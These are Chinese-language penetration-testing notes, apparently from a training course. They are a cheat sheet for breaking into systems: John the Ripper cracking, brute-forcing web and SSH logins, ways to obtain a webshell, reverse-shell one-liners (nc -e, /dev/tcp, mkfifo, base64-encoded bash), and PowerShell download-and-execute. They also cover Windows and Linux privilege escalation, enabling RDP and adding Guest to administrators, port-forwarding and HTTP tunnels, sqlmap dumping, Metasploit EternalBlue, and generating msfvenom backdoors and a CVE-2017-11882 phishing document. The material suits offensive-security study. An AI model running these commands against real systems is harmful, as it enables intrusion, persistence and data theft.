![image-20240403111723713](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240403111723713.png)

---

## 离线密码破解 John the Ripper

shadow 文件爆破

```sh
sudo john /tmp/shadow
sudo john /tmp/shadow --wordlist=~/tools/wordLists/pass_top1000.txt
sudo john /tmp/shadow --show
```

md5 密文破解

```sh
sudo john /tmp/md5 --format=Raw-MD5 --wordlist=~/tools/wordLists/pass_top1000.txt
https://www.cmd5.com/
https://pmd5.com/
```

## 网站后台爆破 BP

使用Burp Suite 爆破网站后台登录，或者利用wpscan 爆破wordpress 后台。





> 验证码问题

人机类验证码的存在就是为了防止爆破的：

- 如果验证码不能识别，基本上可以放弃了；
-  是否可以爆破验证码； 
- 是否可以直接删除验证码； 
- 验证码是否会回显到客户端，例如在Cookie 里等。





# Getshell

> 获取Getshell方法：

1. 文件上传漏洞直接上传木马
2. 服务器配置不当，利用PUT 方法上传任意文件
3. 利用网站功能，编辑后台脚本文件、修改网站配置、利用备份功能、 利用zip 压缩流、第三方插件；
4. 利用SQL 注入漏洞，读写文件；
5. 利用文件包含漏洞，包含图片马、包含日志；
6. 组件0DAY，Web 容器解析漏洞、CMS 漏洞
7.  RCE漏洞

---

编辑后台脚本文件：

```
当进入后台之后，有些网站会提供编辑、修改网站后台脚本的功能，利用这个功能就可以编写后台脚本文件，包括PHP 文件等
```

修改网站配置:

```
网站在进行文件上传限制的时候，通常会采用黑白名单策略。考虑是否可以修改文件上传白名单？
```

利用备份功能:

```
利用备份功能，其实就是利用创建文件功能，类似于“另存”。
```

 利用zip 压缩流:

```
利用网站后台压缩，解压缩功能，在压缩与解压缩的过程中，就可以创建文件。
```

第三方插件:

```
将恶意代码打包到网站插件中，通过网站插件管理功能，安装带后门的插件。
```

包含图片马

```
需要与文件上传漏洞相结合。
```

包含日志

```
在没有文件上传漏洞的条件下，可以考虑包含日志（系统日志，Web 日志等），通过一定的行为（正常访问或错误触发）将信息写入日志，信息
中就包含一句话木马。
```

---



# 反弹Shell -持续连接

WebShell 是基于应用层的HTTP/HTTPS 协议，无法与目标服务器建立持久性TCP 连接。目前来说，要想保持持久性连接，通信过程不能四次挥手。

## 建立Shell 通道

![image-20240403170253450](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240403170253450.png)

WebShell （正向Shell）是基于HTTP 的，不是持久性链接，可以通过反弹Shell 的方法获得持久性连接（基于TCP 协议的）。 通常情况下，将持久性Shell 作为提权的前提条件。

## windows 平台

>  cmd 反弹 ：需要借助nc 工具。netcat瑞士军刀
>
> 步骤： 1.上传nc.exe 到服务器；2.本地监听特殊端口号

1.攻击机监听端口

```
nc -lnvp 1234
```

2.被攻击服务器端反弹Shell 【这些都可去在线反弹shell上生成】

```
nc.exe -e cmd.exe 10.4.7.1 1234

/c C:\RECYCLER\nc.exe -e cmd.exe 10.9.69.77 1234
/c C:\RECYCLER\pr.exe "C:\RECYCLER\nc.exe -e cmd.exe 10.9.69.77 1234"
```

> 2 powershell 反弹:需要从外网下载工具

1.攻击机监听端口 (如果失败、识别不了之类的，可能是因为外网下载，可以手动下载本地再上传)

```
powershell IEX (New-Object
System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');
powercat -l -p 1234
```

2.服务器端反弹shell (如果失败、识别不了之类的，可能是因为外网下载，可以手动下载本地再上传)

```sh
powershell IEX (New-Object
System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 10.4.7.1 -p 1234 -e cmd   #将cmd发送到 10.4.7.1:1234
```





## linux 平台

在获得目标系统WebShell 的情况下

1.本地监听端口 -nc工具

```sh
nc -lnvp 2333
ncat -lnvp 2333
```

2 服务端反弹shell 【这些都可去在线反弹shell上生成】

```
# nc 反弹shell
nc -e /bin/bash 10.4.7.1 2333

# nc 无-e 参数
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.4.7.1 2333 >/tmp/f

# 利用bash 反弹
/bin/bash -i >& /dev/tcp/10.4.7.1/2333 0>&1
bash -i >& /dev/tcp/10.4.7.1/2333 0>&1
/bin/sh -i >& /dev/tcp/10.4.7.1/2333 0>&1
sh -i >& /dev/tcp/10.4.7.1/2333 0>&1

# 反弹shell 命令编码
echo "L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjQuNy4xLzIzMzQgMD4mMQ==" | base64 -d | bash
```





# 权限提升

提权前提是持久化连接--反弹shell

## Windows 提权

Windows 操作系统本身就有提权漏洞，如果没有打补丁，就意味着漏洞存在.

> 补丁与漏洞对照表

```
KB944653 MS07-067
KB942831 MS08-005
KB952004 MS09-012 PR
KB956572 MS09-012 巴西烤肉
KB977165 MS10-015 Ms Viru
KB970483 MS09-020 IIS6
KB971657 MS09-041
KB2124261 MS10-065
KB2271195 MS10-065 IIS7
KB2360937 MS10-084
KB2393802 MS11-011
KB2478960 MS11-014
KB2503665 MS11-046
KB2507938 MS11-056
KB2566454 MS11-062
KB2592799 MS11-080
KB2620712 MS11-097
KB2646524 MS12-003
KB2645640 MS12-009
KB2641653 MS12-018
KB2621440 MS12-020
KB2707511 MS12-042 sysret -pid
KB2829361 MS13-046
KB2850851 MS13-053 EPATHOBJ 0day 限32位
KB3000061 MS14-058
KB3031432 MS15-015
KB3045171 MS15-051
KB3077657 MS15-077
KB3079904 MS15-097
KB3134228 MS16-014
KB3124280 MS16-016
KB3139914 MS16-032
KB3198234 MS16-135
KB4013081 MS17-017
```

> 查看系统补丁信息

```sh
# windows 2003
systeminfo>C:\Windows\Temp\a.txt&(for %i in (KB3057191 KB2840221 KB3000061 KB2850851 KB2711167 KB2360937 KB2478960
KB2507938 KB2566454 KB2646524 KB2645640 KB2641653 KB944653 KB952004 KB971657 KB2620712 KB2393802 KB942831 KB2503665
KB2592799 KB956572 KB977165 KB2621440) do @type C:\Windows\Temp\a.txt|@find /i "%i"|| @echo %i Not Installed!)&del /f
/q /a C:\Windows\Temp\a.txt

# windows 2008
systeminfo>C:\Windows\Temp\a.txt&(for %i in (KB3124280 KB3143141 KB3134228 KB3079904 KB3077657 KB3124280 KB3045171
KB2829361 KB3000061 KB2850851 KB2707511 KB970483 KB2124261 KB2271195 KB3031432) do @type C:\Windows\Temp\a.txt|@find
/i "%i"|| @echo %i Not Installed!)&del /f /q /a C:\Windows\Temp\a.txt

# windows 2012
systeminfo>C:\Windows\Temp\a.txt&(for %i in (KB3124280 KB3143141 KB3134228 KB3079904 KB3077657 KB3124280 KB3045171
KB2829361 KB3000061 KB2850851 KB2707511 KB970483 KB2124261 KB2271195 KB30
```

> 提权

根据补丁与漏洞对照表，可选择MS09-012 提权。具体提权原理涉及到Windows 系统底层知识，只需要使用提权EXP 即可

```
C:\RECYCLER\pr.exe "whoami"
C:\Windows\Temp\MS15-015.exe "whoami"
C:\inetpub\temp\IISTEM~1\8000-test\MS15-015.exe "whoami"
```

> 远程登录

```
#开启RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

#启用Guest 用户
net user Guest /active:yes
net localgroup administrators Guest /add
net user Guest 123.com
```

##  数据库提权

核心思路（必要条件）： 1.需要（最高权限）数据库账户；2. 利用数据库执行系统命令。

> MSSQL 提权

```
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;

EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE;

exec master..xp_cmdshell "whoami"
```



> MySQL 提权

MySQL 漏洞利用与提权:https://www.sqlsec.com/2020/11/mysql.html



## Linux 提权

Web 用户权限提升至root 用户权限。除了以root 权限执行命令以外，能够读写系统中任意文件，也认为具有最高权限。

> SUID提权

SUID 是特殊权限位，具有SUID 标志的命令在执行期间继承了命令所有者的权限，这个命令所有者通常是root 用户。

```sh
find / -perm -4000 2>/dev/null  
find / -perm -u=s 2>/dev/null #-perm 权限;  -u=s 最少有sid权限；
```

find 提权

```
mkdir ww
find ww -exec 'whoami' \;
find ww -exec '/bin/bash' \;
find ww -exec '/bin/sh' \;
```

> sudo 权限滥用

sudo 以某一个用户身份执行命令，默认情况下，以root 用户身份执行命令。在sudo 命令的时候需要密码验证，神奇的是需要密码是当前用 户密码。 通过 sudo -l 可以查看，当前用户可以 sudo 的命令。

git 提权

```
sudo git -p help config

末行模式写入（不要:） !/bin/bash
```

---

> 内核提权

利用Linux 系统漏洞进行提权，大多数是内核漏洞。

基本步骤：1. Linux 内核提权信息收集 ；2.直接利用EXP 即可









# 隧道技术

目的：访问目标的3389；

前提条件：

1.获取对方的Getshell

2.有足够的权限上传文件，以及执行权限；

3.目标可以ping通公网ip；

---



## 单内网 -解决方法：端口映射

目标在内网，攻击者在公网。这种情况下，只能访问80 不能访问3389 等其他端口。

<img src="https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240403155647113.png" alt="image-20240403155647113" style="zoom:67%;" />

使用工具：lcx.exe端口转发工具

> 1.公网攻击者命令 【攻击者必须有公网IP】

```sh
lcx.exe -listen 2333 3389   #win 
./portmap -m 2 -p1 2333 -p2 3389   #linux 【-m 模式 ，-p1 2333 -p2 3389 将本机的两个端口进行连接，从 2333进入的流量从3389出来，从3389进入的流量也可以从2333出来】
```

> 2.目标服务器命令
>
>   需要先将lcx.exe通过webshell上传到目标服务器

```sh
lcx.exe -slave 【公网服务器IP】 2333 127.0.0.1 3389 # 将本机 127.0.0.1 3389 的流量发送到 【公网服务器IP】 2333
```

> 3.远程桌面链接

```sh
rdesktop 127.0.0.1
remmina
```

缺点 :1.流量是否加密； 2.需要公网服务器； 3.无法访问其他端口；

![image-20240403171336794](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240403171336794.png)

---

## 双内网-解决方法：HTTP隧道

目标在内网，攻击者也在内网

<img src="https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240403160428435.png" alt="image-20240403160428435" style="zoom:67%;" />

---

使用工具：

reGeorg,reGeorg主要是把内网服务器的端口通过 http/https 隧道转发到本机,形成一个隧道

ProxyChains使任何程序通过代理上网,允许TCP和DNS通过代理隧道,支持HTTP、SOCKS4和SOCKS5类型的代理服务器.

1.隧道出口文件为`tunnel.nosocket.php`,需要将其上传到目标服务器；

---

> 1.攻击者命令

```sh
python reGeorgSocksProxy.py -u http://10.9.64.174/php/tunnel.nosocket.php -p 9999
```

 出现`All Seems fine` 表示成功建立http隧道；流量入口 9999 ，出口`tunnel.nosocket.php`文件

```sh
sudo vim /etc/proxychains4.conf  #设置，让流量从9999出来【ProxyChains代理工具。 可以使任何程序通过代理上网】
写入： socks5 127.0.0.1 9999
```

```sh
proxychains remmina  # 启动远程连接
```

---





# 软件

## Nmap

nmap 被誉为“扫描器之王”：免费，跨平台，速度快

![image-20240403180753246](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240403180753246.png)

![image-20240403180805923](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240403180805923.png)

> 实例

```sh
nmap -sP 192.168.1.0/24  # ping 扫描主机
nmap -iL C:\Users\smk\Desktop\targets.txt  #扫描文件中的所有目标地址
nmap 192.168.0.100/24 -exclude 192.168.0.1  #扫描除某一个目标地址之外的所有目标地址
nmap 192.168.0.100/24 -excludefile C:\Users\smk\Desktop\targets.txt #扫描除某一文件中的目标地址之外的目标地址
nmap 192.168.0.6 -p 135,443,445  #扫描某一目标地址的21、22、23、80端口
nmap --traceroute 192.168.0.6 #对目标地址进行路由跟踪
nmap -O 192.168.0.6 #通过指纹识别技术识别目标地址的操作系统的版本
```

---



## SQLmap

Sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL进行SQL注入，采用了5种SQL注入技术；

- 联合查询
- 报错注入
- 堆叠查询
- 布尔盲注
- 延时注入

---

基础操作

```
-u：指定目标URL（可以是HTTP协议也可以是HTTPS协议）

-d：连接数据库

-D：选择使用哪个数据库

-T：选择使用哪个表

-C：选择使用哪个列

-r：加载文件中的HTTP请求（本地保存的请求包txt文件）

-l：加载文件中的HTTP请求（本地保存的请求包日志文件）

-data：data指定的数据会当做POST数据提交

-c：指定配置文件，会按照该配置文件执行动作

--delay：设置多久访问一次

--param-del="分割符"：设置参数的分割符

--timeout：设定超时时间

--thread 最大为10：设置多线程
```

数据库操作

```
--dbs：列出所有的数据库

--current-db：列出当前数据库

--tables：列出当前的表

--columns：列出当前的列

--dump：获取字段中的数据
```

高级操作

```
--batch：自动选择yes

--smart：启发式快速判断，节约浪费时间

--forms：尝试使用POST注入

-g：自动获取Google搜索的前一百个结果，对有GET参数的URL测试

-o：开启所有默认性能优化

--tamper：调用脚本进行注入

-v：指定SQLMap的回显等级

--os-shell：获取主机shell，一般不太好用，因为没权限

-m：批量操作

--level：设置注入探测等级

--risk：风险等级

--identify-waf：检测防火墙类型

--skip-urlencode：不进行URL编码

--keep-alive：设置持久连接，加快探测速度

--null-connection：检索没有body响应的内容，多用于盲注
```

在探测目标URL是否存在漏洞的过程中，Sqlmap会和我们进行交互。

- 第一处交互的地方是说这个目标系统的数据库好像是Mysql数据库，是否还探测其他类型的数据库。我们选择 n，就不探测其他类型的数据库了，因为我们已经知道目标系统是Mysql数据库了。
- 第二处交互的地方是说 对于剩下的测试，问我们是否想要使用扩展提供的级别(1)和风险(1)值的“MySQL”的所有测试吗？ 我们选择 y。
- 第三处交互是说已经探测到参数id存在漏洞了，是否还探测其他地方，我们选择 n 不探测其他参数了 。
- 最后sqlmap就列出了参数id存在的注入类型是boolean盲注，还有payload其他信息也显示出来了，最后还列出了目标系统的版本，php，apache等信息。

---

> 简单使用：

```sh
sqlmap -r http.txt   #http.txt是我们抓取的http的请求包
sqlmap -r http.txt -p username  #指定参数，当有多个参数而你又知道username参数存在SQL漏洞，你就可以使用-p指定参数进行探测
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"   #探测该url是否存在漏洞
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --cookie="抓取的cookie"   #当该网站需要登录时，探测该url是否存在漏洞
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --data="uname=admin&passwd=admin&submit=Submit"  #抓取其post提交的数据填入
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --users      #查看数据库的所有用户
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --passwords  #查看数据库用户名的密码
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --current-user  #查看数据库当前的用户
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --is-dba    #判断当前用户是否有管理员权限
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --roles     #列出数据库所有管理员角色，仅适用于oracle数据库的时候

sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"  --dbs        #爆出所有的数据库
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"  --tables     #爆出所有的数据表
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"  --columns    #爆出数据库中所有的列
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"  --current-db #查看当前的数据库
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --tables #爆出数据库security中的所有的表
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --columns #爆出security数据库中users表中的所有的列
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users -C username --dump  #爆出数据库security中的users表中的username列中的所有数据

sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --dump-all #爆出数据库security中的users表中的所有数据
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --dump-all   #爆出数据库security中的所有数据
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --dump-all  #爆出该数据库中的所有数据

sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --tamper=space2comment.py  #指定脚本进行过滤，用/**/代替空格
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --level=5 --risk=3 #探测等级5，平台危险等级3，都是最高级别。当level=2时，会测试cookie注入。当level=3时，会测试user-agent/referer注入。
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --sql-shell  #执行指定的sql语句
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --os-shell/--os-cmd   #执行--os-shell命令，获取目标服务器权限

sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --file-read "c:/test.txt" #读取目标服务器C盘下的test.txt文件
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --file-write  test.txt  --file-dest "e:/hack.txt"  #将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt

sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --dbms="MySQL"     #指定其数据库为mysql Firebird, HSQLDB, IBM DB2, Informix, Microsoft Access, Microsoft SQL Server, MySQL, Oracle, PostgreSQL, SAP MaxDB, SQLite, Sybase
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --random-agent   #使用任意的User-Agent爆破
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --proxy="http://127.0.0.1:8080"    #指定代理
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --technique T    #指定时间延迟注入，这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式，当然，我们也可以直接手工指定。
支持的探测方式如下：
　　B: Boolean-based blind SQL injection（布尔型注入）
　　E: Error-based SQL injection（报错型注入）
　　U: UNION query SQL injection（可联合查询注入）
　　S: Stacked queries SQL injection（可多语句查询注入）
　　T: Time-based blind SQL injection（基于时间延迟注入）

-v3                   #输出详细度  最大值5 会显示请求包和回复包
--threads 5           #指定线程数
--fresh-queries       #清除缓存
--flush-session       #清空会话，重构注入
--batch               #对所有的交互式的都是默认的
--random-agent        #任意的http头
--tamper base64encode            #对提交的数据进行base64编码
--referer http://www.baidu.com   #伪造referer字段

--keep-alive     保持连接，当出现 [CRITICAL] connection dropped or unknown HTTP status code received. sqlmap is going to retry the request(s) 保错的时候，使用这个参数
```



## MSF

| 命令          | 解释                                                |
| ------------- | --------------------------------------------------- |
| msfconsole    | 命令行模式启动MSF                                   |
| exit          | 退出MSF 控制台终端，退出会话                        |
| use           | 使用某一个模块                                      |
| info          | 查看模块的详细信息                                  |
| set           | 模块选项设置                                        |
| show options  | 查看脚本配置选项                                    |
| run / exploit | 启动脚本                                            |
| search        | 搜索关键字 type:auxiliary path:telnet cve:2018-7600 |
| back          | 退出模块                                            |
| show targets  | 显示适用的主机类型                                  |
| show payloads | 显示适用的payload 类型                              |
| background    | 显示适用的payload 类型                              |
| sessions -i   | 会话管理                                            |

 搜索命令用法示例

```
search ms17_010
search bluekeep
search CVE:2018-7600
search type:auxiliary path:telnet
```

> 主机发现
>
> Metasploit 中提供了一些辅助模块可用于主机发现 `auxiliary/scanner/discovery/*`
>
> 使用arp_sweep 来枚举本地局域网中的所有活跃主机

```sh
msf6 > use auxiliary/scanner/discovery/arp_sweep
msf6 auxiliary(scanner/discovery/arp_sweep) > set RHOSTS 10.9.69.0/24
RHOSTS => 10.9.69.0/24
msf6 auxiliary(scanner/discovery/arp_sweep) > set THREADS 50
THREADS => 50
msf6 auxiliary(scanner/discovery/arp_sweep) > run
```

> 端口扫描
>
> Metasploit 的辅助模块中提供了几款实用的端口扫描器 `auxiliary/scanner/portscan/*`
>
> 一般情况下推荐使用syn 端口扫描器，因为他的扫描速度较快，结果比较准确且不易被对方察觉

```sh
msf6 > search type:auxiliary path:portscan
Matching Modules
================
 # Name Disclosure Date Rank Check Description
 - ---- --------------- ---- ----- -----------
 0 auxiliary/scanner/portscan/ftpbounce normal No FTP Bounce Port Scanner
 1 auxiliary/scanner/natpmp/natpmp_portscan normal No NAT-PMP External Port Scanner
 2 auxiliary/scanner/sap/sap_router_portscanner normal No SAPRouter Port Scanner
 3 auxiliary/scanner/portscan/xmas normal No TCP "XMas" Port Scanner
 4 auxiliary/scanner/portscan/ack normal No TCP ACK Firewall Scanner
 5 auxiliary/scanner/portscan/tcp normal No TCP Port Scanner
 6 auxiliary/scanner/portscan/syn normal No TCP SYN Port Scanner
Interact with a module by name or index. For example info 6, use 6 or use auxiliary/scanner/portscan/syn
msf6 > use 6
msf6 auxiliary(scanner/portscan/syn) > set RHOSTS 10.9.65.1
RHOSTS => 10.9.65.1
msf6 auxiliary(scanner/portscan/syn) > set PORTS 1-100,3389,3306,1521,1433,7001,6379
PORTS => 1-100,3389,3306,1521,1433,7001,6379
msf6 auxiliary(scanner/portscan/syn) > set THREADS 50000
THREADS => 50000
msf6 auxiliary(scanner/portscan/syn) > run
[+] TCP OPEN 10.9.65.1:23
[+] TCP OPEN 10.9.65.1:80
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/portscan/syn) >
```

> 服务详细信息
>
> 在Metasploit 中可以调用系统中的命令，比如可以使用Nmap 探测目标的详细服务信息

```
msf6 > sudo nmap -A -p- -sS -sC -T4 -Pn 10.9.69.151
```

> 服务查点
>
> 在Metasploit 的辅助模块中，有很多用于服务扫描和查点的工具，这些工具通常以类似的方式ssh_version 命名。该模块可用于遍历网络 中包含某种服务的主机，并进一步确定服务的版本。下例使用SSH 服务查点

```sh
msf6 > search ssh_version
Matching Modules
================
 # Name Disclosure Date Rank Check Description
 - ---- --------------- ---- ----- -----------
 0 auxiliary/fuzzers/ssh/ssh_version_15 normal No SSH 1.5 Version Fuzzer
 1 auxiliary/fuzzers/ssh/ssh_version_2 normal No SSH 2.0 Version Fuzzer
 2 auxiliary/fuzzers/ssh/ssh_version_corrupt normal No SSH Version Corruption
 3 auxiliary/scanner/ssh/ssh_version normal No SSH Version Scanner
 
msf6 > use 3
msf6 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 10.9.69.0/24
RHOSTS => 10.9.69.0/24
msf6 auxiliary(scanner/ssh/ssh_version) > set THREADS 50
THREADS => 50
msf6 auxiliary(scanner/ssh/ssh_version) > show options
Module options (auxiliary/scanner/ssh/ssh_version):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 RHOSTS 10.9.69.0/24 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:
<path>'
 RPORT 22 yes The target port (TCP)
 THREADS 50 yes The number of concurrent threads (max one per host)
 TIMEOUT 30 yes Timeout for the SSH probe
msf6 auxiliary(scanner/ssh/ssh_version) > run
```

> 口令猜测
>
> 在确定了网络上的SSH 服务之后，可以使用MSF 中的ssh_login 模块对SSH 服务进行口令猜测攻击，在进行口令攻击之前，需要一个好用的 用户名和口令字典。

```sh
msf6 > search ssh_login
Matching Modules
================
 # Name Disclosure Date Rank Check Description
 - ---- --------------- ---- ----- -----------
 0 auxiliary/scanner/ssh/ssh_login normal No SSH Login Check Scanner
 1 auxiliary/scanner/ssh/ssh_login_pubkey normal No SSH Public Key Login Scanner
Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/ssh/ssh_login_pubkey
msf6 > use 0
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 10.9.65.178
RHOSTS => 10.9.65.178
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME flag4
USERNAME => flag4
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FiLE /usr/share/john/password.lst
PASS_FiLE => /usr/share/john/password.lst
msf6 auxiliary(scanner/ssh/ssh_login) > set THREADS 40
THREADS => 40
msf6 auxiliary(scanner/ssh/ssh_login) > run
[*] 10.9.65.178:22 - Starting bruteforce
[+] 10.9.65.178:22 - Success: 'flag4:orange' 'uid=1001(flag4) gid=1001(flag4) groups=1001(flag4) Linux DC-1 3.2.0-6-
486 #1 Debian 3.2.102-1 i686 GNU/Linux '
[*] Command shell session 1 opened (10.9.65.228:40151 -> 10.9.65.178:22) at 2021-05-09 22:53:35 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/ssh_login) >
```

> 网站敏感目录扫描
>
> 可以借助Metasploit 中的辅助模块来进行敏感目录扫描。他们主要使用暴力猜解的方式工作，注意此处需要提供一个目录字典

```sh
msf6 > use auxiliary/scanner/http/dir_scanner
msf6 auxiliary(scanner/http/dir_scanner) > set RHOSTS 10.9.65.178
RHOSTS => 10.9.65.178
msf6 auxiliary(scanner/http/dir_scanner) > set THREADS 50
THREADS => 50
msf6 auxiliary(scanner/http/dir_scanner) > run
```

> 扫描内网中存在特定漏洞的主机
>
> windows

```sh
exploit/windows/smb/ms08_067_netapi
auxiliary/scanner/smb/smb_ms17_010
auxiliary/scanner/rdp/cve_2019_0708_bluekeep
```

---

> 主动渗透攻击
>
> 以永恒之蓝为例

```sh
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.9.65.224
RHOSTS => 10.9.65.224
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
...
[+] 10.9.65.224:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.9.65.224:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.9.65.224:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 2 opened (10.9.65.228:4444 -> 10.9.65.224:58943) at 2021-05-09 23:11:58 -0400
meterpreter >
```

---

> 被动渗透攻击
>
> 以office2007-2016为例

下载利用脚本

```
┌──(ajest💋zh-CN)-[~/tools/office]
└─$ git clone https://github.com/starnightcyber/CVE-2017-11882.git
┌──(ajest💋zh-CN)-[~/tools/office]
└─$ cd CVE-2017-11882
┌──(ajest💋zh-CN)-[~/tools/office/CVE-2017-11882]
└─$ ls
Command_CVE-2017-11882.py example PS_shell.rb README.md
```

与MSF 联动

```
msf6 > use exploit/ajest/office_cve_2017_11882
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(ajest/office_cve_2017_11882) > set SRVPORT 80
SRVPORT => 80
msf6 exploit(ajest/office_cve_2017_11882) > set URIPATH /a
URIPATH => /a
msf6 exploit(ajest/office_cve_2017_11882) > run
```

生成钓鱼文档

```
┌──(ajest💋zh-CN)-[~/tools/office/CVE-2017-11882]
└─$ python Command_CVE-2017-11882.py -c "mshta http://10.9.69.77/a" -o 如何给女朋友过八十大寿.doc
[*] Done ! output file >> 如何给女朋友过八十大寿.doc <<
```

----

### msfvenom

可以利用msfvenom 生成ShellCode，形式多样，从多种编程语言到多平台，再到多种文件格式。简单来说就是生成“木马后门”。

```
Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe

msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.9.69.77 lport=4444 -f exe -o payload.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.10.9 lport=4444 -x wecheat.exe -k -f exe -o wecheat.exe
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.9.69.77 lport=4444 -i 12 -e x86/shikata_ga_nai -f exe -o
payload.exe
```

开启msf 监听

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.10.9
LHOST => 10.10.10.9
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > run
```





## AWVS

启动AWVS

```
sudo systemctl restart acunetix
http://localhost:3443/
```

> 通用账号密码

```
ajest@kali.org/abc123!@#
```



## JoomScan 


JoomScan 是一款专门用于扫描 Joomla 内容管理系统（CMS）的工具，它能够帮助您发现 Joomla 网站中的安全漏洞和弱点。

1. `-u` 或 `--url`：指定要扫描的目标 Joomla 网站的 URL。

   ```
   arduinoCopy code
   joomscan -u http://example.com
   ```

2. `-c` 或 `--cookie`：指定连接到目标网站时要使用的 Cookie。

   ```
   bashCopy code
   joomscan -u http://example.com -c "sessionid=abcdef123456"
   ```

3. `-t` 或 `--threads`：指定扫描时使用的线程数。

   ```
   arduinoCopy code
   joomscan -u http://example.com -t 10
   ```

4. `-v` 或 `--verbose`：显示详细的输出信息，包括扫描过程中的调试信息。

   ```
   arduinoCopy code
   joomscan -u http://example.com -v
   ```

5. `-r` 或 `--range`：指定要扫描的 IP 地址范围。

   ```
   Copy code
   joomscan -r 192.168.1.0/24
   ```

6. `-x` 或 `--proxy`：指定要使用的代理服务器。

   ```
   bashCopy code
   joomscan -u http://example.com -x http://proxyserver:8080
   ```

7. `-p` 或 `--ports`：指定要扫描的端口范围，默认为 80 和 443。

   ```
   arduinoCopy code
   joomscan -u http://example.com -p 80,443,8080
   ```

这些只是 JoomScan 的一些常见参数，您可以使用 `joomscan --help` 命令来查看所有可用的参数及其用法。请注意，使用任何扫描工具时都需要谨慎，以免误用或对目标系统造成不必要的影响。

